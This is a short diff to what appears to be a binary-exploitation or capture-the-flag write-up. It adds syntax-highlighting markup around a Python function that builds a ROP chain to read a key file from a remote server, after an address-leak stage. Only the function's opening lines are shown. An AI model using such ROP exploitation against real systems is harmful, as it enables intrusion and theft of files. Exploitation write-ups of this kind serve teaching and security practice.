@@ -129,6 +129,8 @@ def Second_Leakage_Stage(conn,ImageBase):
 Now we have all the addresses we need to construct our ROP chain that defined in **Figure[9]** and we will achieve it by using the following snippet of code.
 
 > Constructing ROP chains
+{:.filename}
+{% highlight Python %}
 def Open_Read_Write(conn,InputAddress,ImageBase,readfile_Fun,openfile_Fun):
  print("[x] reading key file from remote server...")   
  try:
